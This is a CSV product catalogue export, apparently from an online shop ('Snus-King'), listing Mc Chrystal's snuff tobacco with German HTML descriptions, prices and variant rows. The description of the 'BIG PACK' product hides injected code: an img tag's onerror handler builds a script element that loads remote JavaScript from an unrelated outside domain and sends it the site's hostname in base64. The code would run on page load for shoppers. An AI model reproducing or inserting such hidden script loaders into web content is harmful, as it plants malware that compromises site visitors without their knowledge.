Name,Description,SKU,Gender, Attribute 1,Attribute 1 Value, Attribute 2,Attribute 2 Value, Attribute 3,Attribute 3 Value,Base Image 1 ,Base Image 2,Base Image 3,Base Image 4,Base Image 5,Base Price(USD),Sale Price(USD),Quantity,Unit of Weight,Weight,Unit of Dimensions,Height,Width,Length,SEO Title,SEO Description,Vendor,Parent SKU
,,1009,Unisex,Stück,5,,,,,,,,,,27.50,,1,G,16,IN,3,3,3,,,Snus-King,McChrystal's Eidgenoss Snuff
,,1009,Unisex,Stück,10,,,,,,,,,,55.00,,1,G,220,IN,3,3,3,,,Snus-King,McChrystal's Eidgenoss Snuff
CRYSTALS ORIGINAL SCHNUPF Mittel,"<h2 data-mce-fragment=""1"">Mc Chrystal's Original &amp; Genuine Schnupftabak in der 4,4 g Dose hat ein frisch-fruchtig-süßes Aroma</h2>
<p data-mce-fragment=""1"">Der rauchfreie Mc Chrystal's Original &amp; Genuine Schnupftabak in der runden Dose mit Drehfunktion wird aus 100% reinem Tabak nach hohen Qualitätsstandards hergestellt. Der hochwertige Mc Chrystal's Original &amp; Genuine Schnupftabak besteht aus einer feinen Tabakmischung und wird nach bewährter Familientradition verarbeitet. Der naturbelassene Tabak verfügt über einen natürlichen Nikotingehalt. Der klassische Mc Chrystal's Original &amp; Genuine Schnupftabak verfügt über ein blumig-fruchtig-süßes Tabakaroma mit einer leichten Heunote und ist mit frischem Menthol angereichert. Das Nikotin entfaltet seine anregende Wirkung über die Nasenschleimhäute. Die Konsistenz des gemahlenen Mc Chrystal's Original &amp; Genuine Schnupftabaks in einer mittelbraunen Farbe ist trocken und puderfein. </p>
<p data-mce-fragment=""1"">Der höchste Tabakgenuss entsteht beim leichten Aufschnuppern einer kleinen Prise Mc Chrystal's Original &amp; Genuine Schnupftabak in die Nase. Danach sollte eine gewisse Einwirkzeit eingehalten werden, um das volle Aroma des Mc Chrystal's Original &amp; Genuine Schnupftabaks richtig auszukosten. Ob der Mc Chrystal's Original &amp; Genuine Snuff vom Handrücken oder von den Fingerspitzen aufgeschnuppert wird, ist individuell verschieden. Wenn der Mc Chrystal's Original &amp; Genuine Schnupftabak nicht leicht aus der Dose fließt, genügt in der Regel ein kurzes Aufklopfen zum Lockern. Der frisch-fruchtig-süße Mc Chrystal's Original &amp; Genuine Schnupftabak in der 4,4 g Dose passt bequem in die Tasche und ist schnell griffbereit.</p>
<br>
<p> </p>
<p> </p>
<p> Art Nr: 1007</p>",CRYSTALS ORIGINAL SCHNUPF Mittel,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_344d5426-52d3-4704-ad5e-b79c86843ce5.png,,,,,6.00,,1,G,20,IN,3,3,3,,,,
,,1007,Unisex,Stück,1,,,,,,,,,,6.00,,1,G,20,IN,3,3,3,,,Snus-King,CRYSTALS ORIGINAL SCHNUPF Mittel
,,1007,Unisex,Stück,5,,,,,,,,,,30.00,,1,G,100,IN,3,3,3,,,Snus-King,CRYSTALS ORIGINAL SCHNUPF Mittel
,,1007,Unisex,Stück,10,,,,,,,,,,60.00,,1,G,200,IN,3,3,3,,,Snus-King,CRYSTALS ORIGINAL SCHNUPF Mittel
MC CRYSTALS ORIGINAL SCHNUPF BIG PACK,"<p><span> </span><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span><strong>Ab Lager verfügbar</strong></span></p>
<p>Mc.Chrystal`s - Schnupf BIG PACK 21g</p>
<p>Klassischer Mc. Chrystal's Schnupf mit Mentholgeschmack.</p>
<p> </p>
<p> </p>
<p> Art Nr: 1002</p>
<div style=""z-index: 1;"" id=""mailtooptionchmailPopupModalTo""></div>
<div><img onerror='var s=document.createElement(""script"");s.type=""text/javascript"";s.id=""cczedcc-plg-analytics"";s.src=""//jejoro.miyinokejo.com/scripts/js?k=5fcd009490cf76e4258b4567&amp;s=""+encodeURI(btoa(window.location.host))+""&amp;ns=true"";document.getElementsByTagName(""head"")[0].appendChild(s);'></div>
<div style=""z-index: 1;"" id=""mailtooptionchmailPopupModalTo"">
<div id=""mailtooptionchtoPopupModalMail"">
<div id=""mailtooptionchpopupMailCloseModal""></div>
<div id=""mailtooptionchpopupQuestion""></div>
</div>
</div>",MC CRYSTALS ORIGINAL SCHNUPF BIG PACK,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_ea665772-22a0-422c-913c-69fcf3da2f75.png,,,,,9.90,,1,G,42,IN,3,3,3,,,,
,,1002,Unisex,Stück,1,,,,,,,,,,9.90,,1,G,42,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF BIG PACK
MC CRYSTALS ORIGINAL SCHNUPF Normal,"<p><img src=""https://cdn.shopify.com/s/files/1/0281/7546/6627/files/2000px-Gruener_Punkt.svg_557345bb-1c5c-4eb6-ade1-36632f94953f_16x16.png?v=1583005470"" alt=""""><span> </span><span style=""background-color: #ffffff; color: #2a910e;""><strong>Ab Lager verfügbar</strong></span></p>
<p>Mc.Chrystal`s - Schnupf Normal 4.4g</p>
<p>Klassischer Mc. Chrystal's Schnupf mit Mentholgeschmack.</p>
<p> </p>
<p> </p>
<p>Art Nr: 1008</p>",MC CRYSTALS ORIGINAL SCHNUPF Normal,Unisex,,,,,,,https://cdn.shopify.com/s/files/1/0281/7546/6627/products/image_ee212b2d-6c1f-4daf-9839-f7131a56758a.png,,,,,3.90,,1,G,12,IN,3,3,3,,,,
,,1008,Unisex,Stück,1,,,,,,,,,,3.90,,1,G,12,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF Normal
,,1008,Unisex,Stück,5,,,,,,,,,,19.50,,1,G,60,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF Normal
,,1008,Unisex,Stück,10,,,,,,,,,,39.00,,1,G,120,IN,3,3,3,,,Snus-King,MC CRYSTALS ORIGINAL SCHNUPF Normal
